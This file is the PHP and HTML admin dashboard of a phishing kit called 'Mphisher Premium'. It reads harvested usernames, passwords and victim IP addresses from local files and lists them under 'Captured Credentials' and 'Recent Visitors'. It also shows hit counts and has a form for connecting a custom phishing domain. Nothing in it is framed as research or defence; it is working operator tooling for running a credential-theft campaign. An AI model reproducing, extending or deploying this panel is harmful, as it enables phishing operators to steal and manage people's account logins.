<?php
// Admin Panel for Mphisher
$auth_file = '../auth/usernames.dat';
$ip_file = '../auth/ip.txt';

// Read Credentials
$credentials = [];
if (file_exists($auth_file)) {
    $lines = file($auth_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos($line, 'Account:') !== false) {
            $parts = explode('Password:', $line);
            $user = trim(str_replace('Account:', '', $parts[0]));
            $pass = isset($parts[1]) ? trim($parts[1]) : 'N/A';
            $credentials[] = ['user' => $user, 'pass' => $pass, 'time' => date('Y-m-d H:i')];
        }
    }
}

// Read IPs
$ips = [];
if (file_exists($ip_file)) {
    $lines = file($ip_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos($line, 'IP:') !== false) {
            $ip = trim(str_replace('IP:', '', $line));
            $ips[] = $ip;
        }
    }
}

$total_hits = count($ips);
$total_creds = count($credentials);

// Handle Domain Connection (Mock)
$domain = "None Connected";
if (isset($_POST['domain'])) {
    $domain = htmlspecialchars($_POST['domain']);
    file_put_contents('config.json', json_encode(['domain' => $domain]));
} elseif (file_exists('config.json')) {
    $config = json_decode(file_get_contents('config.json'), true);
    $domain = $config['domain'] ?? "None Connected";
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mphisher Premium Admin</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">MPHISHER <span style="color: var(--text-secondary); font-weight: 300;">PREMIUM</span></div>
            <div class="status">
                <span class="badge badge-success">System Online</span>
            </div>
        </header>

        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Hits</h3>
                <div class="value"><?php echo $total_hits; ?></div>
            </div>
            <div class="stat-card">
                <h3>Credentials Captured</h3>
                <div class="value"><?php echo $total_creds; ?></div>
            </div>
            <div class="stat-card">
                <h3>Active Domain</h3>
                <div class="value" style="font-size: 1.2rem; margin-top: 10px; color: var(--accent-primary);"><?php echo $domain; ?></div>
            </div>
        </div>

        <div class="main-content">
            <div class="panel">
                <h2>Captured Credentials</h2>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Username / Email</th>
                                <th>Password</th>
                                <th>Timestamp</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (empty($credentials)): ?>
                                <tr>
                                    <td colspan="4" style="text-align: center; color: var(--text-secondary);">No data captured yet.</td>
                                </tr>
                            <?php else: ?>
                                <?php foreach (array_reverse($credentials) as $cred): ?>
                                    <tr>
                                        <td style="font-weight: 600; color: var(--accent-primary);"><?php echo $cred['user']; ?></td>
                                        <td><code><?php echo $cred['pass']; ?></code></td>
                                        <td style="color: var(--text-secondary);"><?php echo $cred['time']; ?></td>
                                        <td><span class="badge badge-success">Valid</span></td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="side-panel">
                <div class="domain-connector">
                    <h3>Connect Custom Domain</h3>
                    <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 10px 0;">Point your A record to your server IP or use a Cloudflare Tunnel.</p>
                    <form method="POST">
                        <div class="input-group">
                            <input type="text" name="domain" placeholder="example.com" value="<?php echo $domain != 'None Connected' ? $domain : ''; ?>">
                            <button type="submit" class="btn">Connect Domain</button>
                        </div>
                    </form>
                </div>

                <div class="panel" style="padding: 1.5rem;">
                    <h3>Recent Visitors</h3>
                    <div style="margin-top: 1rem;">
                        <?php foreach (array_slice(array_reverse($ips), 0, 5) as $ip): ?>
                            <div style="display: flex; justify-content: space-between; margin-bottom: 0.8rem; font-size: 0.9rem;">
                                <span><?php echo $ip; ?></span>
                                <span style="color: var(--accent-primary);">Just now</span>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Simple auto-refresh mock
        // setInterval(() => window.location.reload(), 10000);
    </script>
</body>
</html>
